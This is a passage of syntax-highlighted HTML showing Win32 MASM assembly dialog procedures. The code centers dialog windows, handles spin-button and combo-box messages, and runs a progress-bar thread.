        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgrect.rcBottom</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgrect.rcTop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dlgheight</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; height</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgrect.rcRight</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgrect.rcLeft</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dlgwidth</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; width</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">desktoprect.rcBottom</span><span class="sc0">       
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgheight</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; bottom</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">desktoprect.rcRight</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgwidth</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; top</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">                     </span><span class="sc1">; handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MoveWindow</span><span class="sc0">                     </span><span class="sc1">; move to center</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">CreateProgressThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">threadid</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PROGRESS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EndDialog</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MYDIALOG_0</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">MYDIALOG_1</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">umsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">

    </span><span class="sc5">CheckParameter1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">umsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_INITDIALOG</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CenterDlg1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">umsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_DESTROY</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Exit1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">umsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CLOSE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Exit1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">umsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_COMMAND</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CheckCommand</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">umsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_VSCROLL</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SpinButtonClick</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">initflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InitValues</span><span class="sc0"> 
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">    

    </span><span class="sc5">CheckCommand</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1009</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1014</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SetOkFlag</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">SpinButtonClick</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pastvalue</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">PressedUp</span><span class="sc0">

    </span><span class="sc5">PressedDown</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">pastvalue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">doneflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Reset</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">currentvalue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DontDecrease</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">currentvalue</span><span class="sc0">

    </span><span class="sc5">DontDecrease</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">currentvalue</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">WM_SETTEXT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1003</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">doneflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">PressedUp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">pastvalue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">currentvalue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'9'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Reset</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">doneflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Reset</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">currentvalue</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">currentvalue</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">WM_SETTEXT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1003</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">doneflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">Reset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">doneflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">SetOkFlag</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">okflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">

    </span><span class="sc5">CenterDlg1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dlgrect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowRect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetDesktopWindow</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">desktoprect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowRect</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgrect.rcBottom</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgrect.rcTop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dlgheight</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; height</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgrect.rcRight</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgrect.rcLeft</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dlgwidth</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; width</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">desktoprect.rcBottom</span><span class="sc0">       
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgheight</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; bottom</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">desktoprect.rcRight</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dlgwidth</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; top</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">             </span><span class="sc1">; handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MoveWindow</span><span class="sc0">             </span><span class="sc1">; move to center</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">initflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
  
    </span><span class="sc5">InitValues</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">initflag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1004</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CB_RESETCONTENT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1004</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">143h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">value11</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1004</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">143h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">value12</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1004</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">143h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">value13</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1004</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">143h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">value14</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1004</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CB_SETCURSEL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1003</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WM_SETTEXT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">currentvalue</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1005</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WM_SETTEXT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">value3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1008</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WM_SETTEXT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">value4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1001</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1006</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1013</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">Exit1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc0">       
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">       
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EndDialog</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MYDIALOG_1</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">PROGRESS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">

    </span><span class="sc5">ClearProgressBar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PBM_SETPOS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">105</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">LittleLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100000h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">LittleLoop</span><span class="sc0">  

    </span><span class="sc5">ProgressLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PBM_SETPOS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">105</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">99d</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">LittleLoop</span><span class="sc0">

    </span><span class="sc5">ProgressDone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">threadid</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

